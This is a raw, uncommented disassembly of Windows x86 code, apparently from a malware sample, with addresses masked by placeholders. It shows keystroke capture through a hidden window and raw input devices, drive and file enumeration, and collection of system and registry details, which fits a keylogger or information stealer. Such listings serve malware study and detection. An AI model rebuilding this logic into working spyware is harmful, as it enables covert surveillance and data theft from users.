movzx eax [ ebp - 0x199 ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1cd ]
or eax 0x4
mov [ ebp - 0x1cd ] ax
movzx eax [ ebp - 0x1b9 ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1cd ]
or eax 0x10
mov [ ebp - 0x1cd ] ax
movzx eax [ ebp - 0x1a9 ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1cd ]
or eax 0x20
mov [ ebp - 0x1cd ] ax
mov eax [ ebp - 0x1d8 ]
mov ax [ eax + 0x10 ]
mov [ ebp - 0x1cf ] ax
mov eax [ ebp - 0x1d8 ]
mov ax [ eax + 0x16 ]
mov [ ebp - 0x1cb ] ax
push rw-data
call [ GetKeyboardState@IAT ]
push 0x0
push [ ebp - 0x1b0 ]
call [ GetWindowThreadProcessId@IAT ]
push eax
call [ GetKeyboardLayout@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c1 ] eax
push [ rw-data ]
push 0x0
push 0x4
push rw-data
push rw-data
movzx eax [ ebp - 0x1cf ]
push eax
movzx eax [ ebp - 0x1cb ]
push eax
call [ ToUnicodeEx@IAT ]
mov [ ebp - 0x1b8 ] eax
push 0x8
push rw-data
push 0x8
lea eax [ ebp - 0x1c9 ]
push eax
call sub_4048da
add esp 0x10
cmp [ ebp - 0x1b8 ] 0x3
jae r-xdata
movzx eax [ ebp - 0x1cd ]
or eax 0x40
mov [ ebp - 0x1cd ] ax
mov [ ebp - 0x1e0 ] 0x3
mov eax [ ebp - 0x1b8 ]
mov [ ebp - 0x1e0 ] eax
jmp r-xdata
mov eax [ ebp - 0x1e0 ]
and [ ebp + eax * 2 - 0x1c9 ] 0x0
push 0x0
push 0x13
lea eax [ ebp - 0x1d0 ]
push eax
mov ecx rw-data
call sub_410811
sub_41b3b1
push ebp
mov ebp esp
sub esp 0x3c
push 0x30
push 0x0
lea eax [ ebp - 0x34 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x34 ] 0x30
mov [ ebp - 0x30 ] 0x4000
mov [ ebp - 0x2c ] sub_41aec6
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_413314
mov [ ebp - 0x20 ] eax
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] r--data
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
call [ RegisterClassExW@IAT ]
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_413314
push eax
push 0x0
push 0x0
push 0x190
push 0x190
push 0x0
push 0x0
push 0x2000000
push r--data
push r--data
push 0x0
call [ CreateWindowExW@IAT ]
mov [ ebp - 0x3c ] eax
push 0x2000000
push 0xfffffff0
push [ ebp - 0x3c ]
call [ SetWindowLongW@IAT ]
push 0x8000000
push 0xffffffec
push [ ebp - 0x3c ]
call [ SetWindowLongW@IAT ]
push 0x0
push [ ebp - 0x3c ]
call [ ShowWindow@IAT ]
push 0x18
pop edx
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2 ] 0x6
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x100
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x3c ]
mov [ eax + 0x8 ] ecx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
add eax 0xc
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x1
mov eax [ ebp - 0x38 ]
mov [ eax + 0x2 ] 0x2
mov eax [ ebp - 0x38 ]
mov [ eax + 0x4 ] 0x100
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x3c ]
mov [ eax + 0x8 ] ecx
push 0xc
push 0x2
push [ ebp - 0x4 ]
call [ RegisterRawInputDevices@IAT ]
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_41b50b
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push rw-data
call sub_41ae8e
pop ecx
mov edx rw-data
mov ecx [ ebp + 0x8 ]
call sub_410cfd
push [ ebp + 0x8 ]
call sub_41b3b1
pop ecx
push 0xea60
call [ Sleep@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_40f76b
mov al 0x1
leave
retn
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call [ PeekMessageW@IAT ]
test eax eax
jne r-xdata
mov ecx rw-data
call sub_40fb19
movzx eax al
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call [ GetMessageW@IAT ]
test eax eax
jne r-xdata
mov ecx rw-data
call sub_401000
test eax eax
jle r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageW@IAT ]
jmp r-xdata
jmp r-xdata
and [ ebp - 0x20 ] 0x0
cmp [ ebp - 0x20 ] 0x3c
jg r-xdata
xor eax eax
inc eax
je r-xdata
mov eax [ ebp - 0x20 ]
inc eax
mov [ ebp - 0x20 ] eax
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_401000
test eax eax
jle r-xdata
mov edx rw-data
mov ecx [ ebp + 0x8 ]
call sub_410cc8
mov ecx rw-data
call sub_401000
push eax
push 0x0
push 0x50
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x70737200
mov ecx rw-data
call sub_401000
push eax
mov ecx rw-data
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
movzx eax al
test eax eax
je r-xdata
mov ecx rw-data
call sub_401000
cmp eax 0x186a0
jle r-xdata
mov edx rw-data
mov ecx [ ebp + 0x8 ]
call sub_410cc8
push rw-data
call sub_41b4f9
pop ecx
mov edx rw-data
mov ecx [ ebp + 0x8 ]
call sub_410c93
mov edx rw-data
mov ecx [ ebp + 0x8 ]
call sub_410c93
mov ecx rw-data
call sub_4106f0
and [ ebp - 0x20 ] 0x0
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x20 ]
cdq
push 0x3c
pop ecx
idiv ecx
test edx edx
jne r-xdata
sub_41b6ad
push ebp
mov ebp esp
sub esp 0x180
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
and [ eax ] 0x0
push r--data
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
xor al al
jmp r-xdata
xor al al
push 0x0
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_411abb
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
leave
retn
push 0x4c
lea eax [ ebp - 0x180 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411a01
cmp [ ebp - 0x180 ] 0x4c
jne r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411aa5
push 0x10
push r--data
lea eax [ ebp - 0x17c ]
push eax
call sub_40325a
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x16c ]
and eax 0x1
je r-xdata
mov eax [ ebp - 0x16c ]
and eax 0x2
je r-xdata
push 0x2
lea eax [ ebp - 0x24 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411a01
push 0x1
movzx eax [ ebp - 0x24 ]
dec eax
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411a49
push 0x2
lea eax [ ebp - 0x24 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411a01
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411a01
cmp [ ebp - 0x1c ] 0x2800
jae r-xdata
cmp [ ebp - 0x20 ] 0x2800
jae r-xdata
mov eax [ ebp - 0x18 ]
and eax 0x1
je r-xdata
push 0x1
mov eax [ ebp - 0x10 ]
sub eax 0x1c
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411a49
push 0x104
lea eax [ ebp - 0x130 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x104
lea eax [ ebp - 0x130 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411a01
mov [ ebp - 0x2d ] 0x0
lea eax [ ebp - 0x130 ]
push eax
call [ lstrlenA@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x1
jle r-xdata
mov eax [ ebp - 0x28 ]
movsx eax [ ebp + eax - 0x130 ]
cmp eax 0x2f
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp + eax - 0x130 ] 0x0
push 0x0
push [ ebp - 0x28 ]
lea edx [ ebp - 0x130 ]
mov ecx [ ebp + 0x8 ]
call sub_414855
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
call sub_411aa5
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x28 ]
movsx eax [ ebp + eax - 0x130 ]
cmp eax 0x3a
je r-xdata
cmp [ ebp - 0x28 ] 0x1
jle r-xdata
mov eax [ ebp - 0x28 ]
dec eax
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
movsx eax [ ebp + eax - 0x130 ]
cmp eax 0x5c
je r-xdata
sub_41b89c
push ebp
mov ebp esp
sub esp 0x210
mov [ ebp - 0x210 ] edx
mov [ ebp - 0x20c ] ecx
lea eax [ ebp - 0x208 ]
push eax
push 0x0
push 0x0
push [ ebp - 0x210 ]
push 0x0
call [ SHGetFolderPathW@IAT ]
test eax eax
jne r-xdata
leave
retn
push 0x0
lea edx [ ebp - 0x208 ]
mov ecx [ ebp - 0x20c ]
call sub_413434
mov edx eax
mov ecx [ rw-data ]
call sub_401cb4
sub_41b8f0
push ebp
mov ebp esp
sub esp 0x688
mov [ ebp - 0x1 ] 0x1
and [ ebp - 0x678 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
call sub_4011f7
cmp [ ebp - 0x678 ] eax
jge r-xdata
mov ecx [ rw-data ]
call sub_401ce5
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0x678 ]
mov ecx [ rw-data ]
call sub_401ccc
push [ eax ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ ebp - 0x67c ] eax
cmp [ ebp - 0x67c ] 0x1
je r-xdata
xor al al
mov al 0x1
jmp r-xdata
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x460 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x464 ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
cmp [ ebp - 0x464 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x67c ] 0x4
je r-xdata
leave
retn
push [ ebp - 0x678 ]
mov ecx [ rw-data ]
call sub_401ccc
push [ eax ]
lea eax [ ebp - 0x670 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x670 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x670 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x460 ]
and eax 0x10
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x67c ] 0x3
je r-xdata
push r--data
lea eax [ ebp - 0x434 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x674 ]
push eax
lea eax [ ebp - 0x670 ]
push eax
push [ ebp + 0x8 ]
call sub_41b6ad
add esp 0xc
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x678 ]
inc eax
mov [ ebp - 0x678 ] eax
cmp [ ebp - 0x67c ] 0x0
je r-xdata
jmp r-xdata
push r--data
lea eax [ ebp - 0x434 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x460 ]
push eax
push [ ebp - 0x678 ]
mov ecx [ rw-data ]
call sub_401ccc
push [ eax ]
push [ ebp + 0x8 ]
call sub_401dae
add esp 0x10
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x67d ] 0x0
and [ ebp - 0x684 ] 0x0
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x460 ]
push eax
push [ ebp - 0x464 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x688 ] 0x0
jmp r-xdata
jmp r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x460 ]
push eax
lea eax [ ebp - 0x670 ]
push eax
push 0x70243102
push 0x70243101
mov ecx [ ebp + 0x8 ]
call sub_412619
movzx eax al
test eax eax
je r-xdata
mov ecx [ rw-data ]
call sub_4011f7
cmp [ ebp - 0x684 ] eax
jge r-xdata
push [ ebp - 0x464 ]
call [ FindClose@IAT ]
jmp r-xdata
mov eax [ ebp - 0x688 ]
cmp eax [ rw-data ]
jge r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
push [ ebp - 0x8 ]
push rw-data
mov ecx [ ebp + 0x8 ]
call sub_4159a1
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ rw-data ]
add eax [ ebp - 0x440 ]
mov [ rw-data ] eax
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x1b58
ja r-xdata
movzx eax [ ebp - 0x67d ]
test eax eax
jne r-xdata
push [ ebp - 0x674 ]
push [ ebp - 0x684 ]
mov ecx [ rw-data ]
call sub_401ccc
push [ eax ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
push [ ebp - 0x688 ]
mov ecx rw-data
call sub_401ccc
push [ eax ]
lea edx [ ebp - 0x670 ]
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov edx 0x3840
mov ecx [ ebp + 0x8 ]
call sub_413b4b
cmp [ rw-data ] 0xc800000
jbe r-xdata
mov edx [ ebp - 0x674 ]
mov ecx [ rw-data ]
call sub_401cb4
jmp r-xdata
mov [ ebp - 0x67d ] 0x1
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x0
lea edx [ ebp - 0x670 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov edx eax
mov ecx [ rw-data ]
call sub_401cb4
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x684 ]
inc eax
mov [ ebp - 0x684 ] eax
mov eax [ ebp - 0x688 ]
inc eax
mov [ ebp - 0x688 ] eax
sub_41bc93
push ebp
mov ebp esp
push 0xffffffff
push sub_423cf5
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2e0
push esi
push edi
push 0x70243101
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x2dc ]
call sub_40fbc4
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x38 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x7c ]
call sub_401c30
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1c ]
call sub_401c30
mov [ ebp - 0x4 ] 0x3
mov eax [ r--data ]
mov [ ebp - 0x28 ] eax
mov eax [ r--data ]
mov [ ebp - 0x24 ] eax
xor eax eax
lea edi [ ebp - 0x20 ]
stosw [ edi ]
push 0xc
pop ecx
mov esi r--data
lea edi [ ebp - 0x6c ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x7c ]
mov [ rw-data ] eax
lea eax [ ebp - 0x1c ]
mov [ rw-data ] eax
push rw-data
push 0x3b
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_401f90
mov ecx rw-data
call sub_4011f7
mov [ rw-data ] eax
push rw-data
push 0x3b
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_401f90
mov ecx rw-data
call sub_4011f7
mov [ rw-data ] eax
push rw-data
push 0x3b
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_401f90
mov ecx rw-data
call sub_4011f7
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x2dc ]
call sub_40fca2
lea eax [ ebp - 0x38 ]
push eax
push rw-data
mov ecx [ ebp + 0x8 ]
call sub_415a51
lea ecx [ ebp - 0x38 ]
call sub_4106f0
push r--data
call [ lstrlenW@IAT ]
test eax eax
je r-xdata
push 0x3c
pop edx
mov ecx [ ebp + 0x8 ]
call sub_413b4b
jmp r-xdata
push 0x8
pop edx
mov ecx [ ebp + 0x8 ]
call sub_41b89c
push 0x1c
pop edx
mov ecx [ ebp + 0x8 ]
call sub_41b89c
push 0x5
pop edx
mov ecx [ ebp + 0x8 ]
call sub_41b89c
push 0x10
pop edx
mov ecx [ ebp + 0x8 ]
call sub_41b89c
push 0x2e
pop edx
mov ecx [ ebp + 0x8 ]
call sub_41b89c
push 0x19
pop edx
mov ecx [ ebp + 0x8 ]
call sub_41b89c
and [ ebp - 0x2e4 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x3b
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_401f90
jmp r-xdata
lea ecx [ ebp - 0x2dc ]
call sub_40fb19
movzx eax al
test eax eax
jne r-xdata
cmp [ ebp - 0x2e4 ] 0x18
jae r-xdata
xor eax eax
inc eax
je r-xdata
mov eax [ ebp - 0x2e4 ]
mov ax [ ebp + eax * 2 - 0x6c ]
mov [ ebp - 0x28 ] ax
push 0x0
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov edx eax
mov ecx [ rw-data ]
call sub_401cb4
jmp r-xdata
mov [ ebp - 0x2e9 ] 0x1
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1c ]
call sub_401c6b
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x7c ]
call sub_401c6b
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x38 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2dc ]
call sub_40f7b3
mov al [ ebp - 0x2e9 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
leave
retn
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov eax [ ebp - 0x2e4 ]
inc eax
mov [ ebp - 0x2e4 ] eax
mov edx 0x12c
mov ecx [ ebp + 0x8 ]
call sub_413b4b
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x2e0 ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
mov eax [ ebp - 0x2e0 ]
mov [ rw-data ] eax
and [ ebp - 0x2e8 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
call sub_4011f7
cmp [ ebp - 0x2e8 ] eax
jge r-xdata
mov ecx [ rw-data ]
call sub_401ca3
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x2dc ]
call sub_40fca2
lea eax [ ebp - 0x38 ]
push eax
push rw-data
mov ecx [ ebp + 0x8 ]
call sub_415a51
lea ecx [ ebp - 0x38 ]
call sub_4106f0
push rw-data
lea ecx [ ebp - 0x2dc ]
call sub_40fdaa
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
push [ ebp - 0x2e8 ]
mov ecx [ rw-data ]
call sub_401ccc
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
push [ ebp + 0x8 ]
call sub_41b8f0
pop ecx
movzx eax al
test eax eax
jne r-xdata
mov eax [ ebp - 0x2e8 ]
inc eax
mov [ ebp - 0x2e8 ] eax
sub_41bfe0
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x100
push 0x368
push 0x0
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
call sub_4031e0
add esp 0xc
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
push r--data
push [ ebp + 0x8 ]
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
mov al 0x1
leave
retn
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x370 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x40
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add eax 0x108
push eax
push r--data
push [ ebp + 0x8 ]
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call sub_41017c
mov [ ebp - 0x4 ] 0x208
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add eax 0x148
push eax
push r--data
push [ ebp + 0x8 ]
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call sub_41017c
mov [ ebp - 0x4 ] 0x20
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add eax 0x350
push eax
push r--data
push [ ebp + 0x8 ]
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call sub_41017c
push 0x0
push 0x368
mov eax [ ebp - 0x8 ]
add eax 0x8
push eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4 ]
call sub_410811
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x374 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x374 ] eax
jmp r-xdata
sub_41c0f9
push ebp
mov ebp esp
push 0xffffffff
push sub_423b2e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax 0x1db0
call sub_40a0e0
push esi
lea ecx [ ebp - 0x1084 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1db4 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1084 ]
call sub_4106f0
push 0x618
push 0x0
lea eax [ ebp - 0x1d9c ]
push eax
call sub_4031e0
add esp 0xc
push 0x45c
push 0x0
lea eax [ ebp - 0xac4 ]
push eax
call sub_4031e0
add esp 0xc
push 0x100
lea eax [ ebp - 0xaac ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x58c0 ]
mov [ ebp - 0xabc ] eax
push 0x40
mov ecx [ ebp + 0x8 ]
call sub_415c87
push eax
lea eax [ ebp - 0x7a4 ]
push eax
call [ lstrcpynW@IAT ]
push 0x40
mov ecx [ ebp + 0x8 ]
call sub_4115c3
push eax
lea eax [ ebp - 0x724 ]
push eax
call [ lstrcpynW@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_4103dd
mov [ ebp - 0xab8 ] eax
mov ecx [ ebp + 0x8 ]
call sub_41a144
mov [ ebp - 0xac0 ] eax
mov ecx [ ebp + 0x8 ]
call sub_41121b
mov [ ebp - 0xac4 ] eax
call [ GetACP@IAT ]
mov [ ebp - 0xab4 ] eax
call [ GetOEMCP@IAT ]
mov [ ebp - 0xab0 ] eax
lea eax [ ebp - 0x9ac ]
push eax
push 0x208
call [ GetCurrentDirectoryW@IAT ]
lea eax [ ebp - 0x684 ]
push eax
call [ GetKeyboardLayoutNameW@IAT ]
lea eax [ ebp - 0x6a4 ]
push eax
call [ GetLocalTime@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x660 ]
mov [ ebp - 0x1074 ] eax
mov eax [ ebp - 0x65c ]
mov [ ebp - 0x1070 ] eax
lea eax [ ebp - 0x1074 ]
push eax
lea eax [ ebp - 0x1074 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ ebp - 0x694 ]
push eax
lea eax [ ebp - 0x1074 ]
push eax
call [ FileTimeToSystemTime@IAT ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x2b78 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x4e7c ]
mov [ ebp - 0x66c ] eax
push 0x0
push 0x45c
lea eax [ ebp - 0xac4 ]
push eax
lea ecx [ ebp - 0x1084 ]
call sub_410811
and [ ebp - 0x438 ] 0x0
jmp r-xdata
push 0x0
push 0x1c
lea eax [ ebp - 0x660 ]
push eax
push 0x3
call [ rw-data ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x438 ]
cmp ecx [ eax + 0x2b78 ]
jae r-xdata
and [ ebp - 0x438 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x438 ]
imul eax eax 0x118
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax + 0x87c ]
mov [ ebp - 0xcf4 ] eax
push 0x0
push 0x4
lea eax [ ebp - 0xcf4 ]
push eax
lea ecx [ ebp - 0x1084 ]
call sub_410811
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x438 ]
cmp ecx [ eax + 0x4e7c ]
jae r-xdata
mov eax [ ebp - 0x438 ]
inc eax
mov [ ebp - 0x438 ] eax
lea ecx [ ebp - 0xcec ]
call sub_401068
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0xcdc ]
call sub_401068
mov [ ebp - 0x4 ] 0x3
and [ ebp - 0x14 ] 0x0
push 0x104
lea eax [ ebp - 0x128c ]
push eax
call [ FindFirstVolumeW@IAT ]
mov [ ebp - 0xcf0 ] eax
cmp [ ebp - 0xcf0 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x438 ]
imul eax eax 0x118
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax + 0x2b80 ]
mov [ ebp - 0xcf4 ] eax
push 0x0
push 0x4
lea eax [ ebp - 0xcf4 ]
push eax
lea ecx [ ebp - 0x1084 ]
call sub_410811
jmp r-xdata
push [ ebp - 0x14 ]
lea ecx [ ebp - 0xcdc ]
call sub_410ad8
push 0x0
lea ecx [ ebp - 0xcdc ]
call sub_401000
push eax
lea ecx [ ebp - 0xcdc ]
call sub_40100f
push eax
lea ecx [ ebp - 0x1084 ]
call sub_410811
lea ecx [ ebp - 0x1db4 ]
call sub_4106f0
push 0x0
lea ecx [ ebp - 0x1db4 ]
call sub_401000
push eax
lea ecx [ ebp - 0x1db4 ]
call sub_40100f
push eax
push 0x5
call [ rw-data ]
mov [ ebp - 0x1290 ] eax
lea ecx [ ebp - 0xcdc ]
call sub_4106f0
mov eax [ ebp - 0x438 ]
inc eax
mov [ ebp - 0x438 ] eax
lea ecx [ ebp - 0x1db4 ]
call sub_40100f
mov [ ebp - 0x434 ] eax
and [ ebp - 0x10 ] 0x0
push 0x1
push 0x1e0
lea ecx [ ebp - 0x1db4 ]
call sub_4105e1
push 0x0
lea ecx [ ebp - 0x1db4 ]
call sub_401000
push eax
lea ecx [ ebp - 0x1db4 ]
call sub_40100f
push eax
push 0x5
call [ rw-data ]
mov [ ebp - 0x1290 ] eax
jmp r-xdata
lea eax [ ebp - 0x430 ]
push eax
push [ ebp - 0x430 ]
lea ecx [ ebp - 0xcec ]
call sub_40100f
push eax
lea eax [ ebp - 0x128c ]
push eax
call [ GetVolumePathNamesForVolumeNameW@IAT ]
lea ecx [ ebp - 0xcec ]
call sub_401000
cmp eax 0x8
jbe r-xdata
jmp r-xdata
push 0x0
push 0x4
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1084 ]
call sub_410811
lea ecx [ ebp - 0x1db4 ]
call sub_40100f
mov [ ebp - 0x434 ] eax
push 0x210
push 0x0
lea eax [ ebp - 0x224 ]
push eax
call sub_4031e0
add esp 0xc
mov esi [ ebp - 0x10 ]
imul esi esi 0x1e0
lea ecx [ ebp - 0x1db4 ]
call sub_401000
cmp esi eax
jae r-xdata
cmp [ ebp - 0x1290 ] 0xc0000004
jne r-xdata
lea ecx [ ebp - 0xcec ]
call sub_401000
mov [ ebp - 0x1dbc ] eax
mov [ ebp - 0x1dbc ] 0x8
jmp r-xdata
push 0x104
lea eax [ ebp - 0x128c ]
push eax
push [ ebp - 0xcf0 ]
call [ FindNextVolumeW@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0xcf8 ] 0x0
mov [ ebp - 0xcfc ] 0x1
lea eax [ ebp - 0x1084 ]
mov [ ebp - 0x1068 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x106c ] eax
lea eax [ ebp - 0x106c ]
push eax
push sub_41bfe0
push 0x0
push 0x1
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_40feb4
push 0x0
push 0x4
lea eax [ ebp - 0xcf8 ]
push eax
